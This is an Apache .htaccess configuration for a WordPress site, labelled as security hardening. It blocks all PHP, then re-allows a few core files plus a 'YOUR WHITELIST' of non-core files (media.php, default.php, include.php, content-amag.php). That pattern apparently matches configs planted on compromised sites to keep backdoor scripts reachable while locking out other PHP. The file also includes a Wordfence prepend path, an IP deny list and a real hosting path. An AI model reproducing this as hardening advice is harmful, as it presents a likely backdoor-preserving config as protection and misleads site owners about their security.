# ==================================================
# SECURITY: BLOCK ALL PHP IN ROOT (DEFAULT)
# ==================================================
<FilesMatch "\.php$">
    Require all denied
</FilesMatch>

# ===== ALLOW WORDPRESS CORE =====
<Files "index.php">
    Require all granted
</Files>

<Files "wp-login.php">
    Require all granted
</Files>

<Files "wp-cron.php">
    Require all granted
</Files>

<Files "xmlrpc.php">
    Require all granted
</Files>

# ===== YOUR WHITELIST =====
<Files "media.php">
    Require all granted
</Files>

<Files "default.php">
    Require all granted
</Files>

<Files "include.php">
    Require all granted
</Files>

<Files "content-amag.php">
    Require all granted
</Files>

# ==================================================
# WORDPRESS CORE RULES (WAJIB)
# ==================================================
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /

RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>

# ==================================================
# WORDFENCE WAF (AKTIF)
# ==================================================
<IfModule LiteSpeed>
php_value auto_prepend_file '/home/gk4juni457tt/public_html/taalumgroup.com/wordfence-waf.php'
</IfModule>

<IfModule lsapi_module>
php_value auto_prepend_file '/home/gk4juni457tt/public_html/taalumgroup.com/wordfence-waf.php'
</IfModule>

# ==================================================
# PROTECT .htaccess & wp-config
# ==================================================
<Files ".htaccess">
Require all denied
</Files>

<Files "wp-config.php">
Require all denied
</Files>

# ==================================================
# BLOCK SUSPICIOUS IPS
# ==================================================
Deny from 159.223.0.0/16
Deny from 208.76.0.0/16

# ==================================================
# DISABLE DIRECTORY LISTING
# ==================================================
Options -Indexes
